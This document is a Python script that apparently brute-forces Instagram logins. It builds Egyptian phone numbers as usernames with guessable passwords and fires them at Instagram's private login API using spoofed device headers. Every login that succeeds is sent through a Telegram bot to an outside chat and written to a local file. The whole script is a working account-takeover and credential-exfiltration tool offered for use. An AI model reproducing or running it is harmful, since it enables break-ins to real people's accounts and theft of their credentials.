import os, sys, requests
import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;31m'
        G = '\x1b[1;32m'
        sleep(2)
        bnar = pyfiglet.figlet_format("HAMADI", font = "doh" )
        print(G + bnar)
        
        sleep(4)
        os.system('clear')
        sleep(2)
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        print('\n')
        ID = input(S + '  ID : ')
        print('\n')
        sleep(2)
        tok = input(S + ' TOKEN : ')
        print('\n')
        sleep(2)
        num = input(S + ' ENTER NUMBER (10 : 11 :22 :15) :')
        print('\n')
        sleep(2)
        print('\n')
        sleep(2)
        print('\n')
        w = 'https://pastebin.com/raw/xPfV5eKD'
        start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=ℙ𝕃𝔼𝔸𝕊𝔼 𝕎𝔸𝕀𝕋 𝔽𝕆ℝ 𝔸 𝕄𝕆𝕄𝔼ℕ𝕋⏸️").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'ĦΣГǾ' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '0987654321'
        while True:
                us = str("".join(random.choice(user)for i in range(8))) 
                username ='+20'+num+us
                password='0'+num+us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid,  'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                    tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.... ℂℍ𝔼ℂ𝕂𝕀ℕ𝔾 𝔸ℂℂ𝕆𝕌ℕ𝕋𝕊\n 𝔼𝕄𝔸𝕀𝕃 : {username}\n ℙ𝔸𝕊𝕊 : {password}\n- "
                    i = requests.post(tlg)
                    with open('mrx.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= @PHP606 @PHP606 𝔼𝕄𝔸𝕀𝕃 [{zz}] \n------------------------------------------\n ℙ𝔸𝕊𝕊 [{aa}]  ( {password} ) \n")
                    print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                    aa += 1
